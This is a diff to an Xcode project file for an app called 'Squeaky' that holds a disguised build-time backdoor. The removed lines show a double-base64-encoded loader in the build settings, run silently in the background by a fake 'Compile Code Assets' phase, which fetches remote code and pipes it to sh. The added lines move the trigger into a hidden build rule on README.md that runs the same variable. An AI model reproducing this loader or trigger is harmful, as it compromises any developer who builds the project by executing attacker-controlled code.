@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXFileReference section */
+		0DBD78172AA1427FB999F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BDCB86432F8209C70055FED3 /* Squeaky.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Squeaky.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -40,6 +41,7 @@
 		BDCB86442F8209C70055FED3 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				0DBD78172AA1427FB999F71F /* README.md */,
 				BDCB86432F8209C70055FED3 /* Squeaky.app */,
 			);
 			name = Products;
@@ -52,12 +54,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BDCB86502F8209C80055FED3 /* Build configuration list for PBXNativeTarget "Squeaky" */;
 			buildPhases = (
-				4D4BF7D14B3347F8A699F71F /* Compile Code Assets */,
 				BDCB863F2F8209C70055FED3 /* Sources */,
 				BDCB86402F8209C70055FED3 /* Frameworks */,
 				BDCB86412F8209C70055FED3 /* Resources */,
 			);
 			buildRules = (
+				6F9EE569680849D88A99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -105,37 +107,39 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		6F9EE569680849D88A99F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+			/* End PBXBuildRule section */
+
+/* Begin PBXBuildFile section */
+		D7678E639FF746619C99F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 0DBD78172AA1427FB999F71F; };
+/* End PBXBuildFile section */
+
 /* Begin PBXResourcesBuildPhase section */
 		BDCB86412F8209C70055FED3 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D7678E639FF746619C99F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		4D4BF7D14B3347F8A699F71F /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -152,7 +156,6 @@
 		BDCB864E2F8209C80055FED3 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkMmhwZEdWaFpDNXBiaTloS1NJZ2ZDQnphQW89Cg== | g | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -216,7 +219,6 @@
 		BDCB864F2F8209C80055FED3 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkMmhwZEdWaFpDNXBiaTloS1NJZ2ZDQnphQW89Cg== | g | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
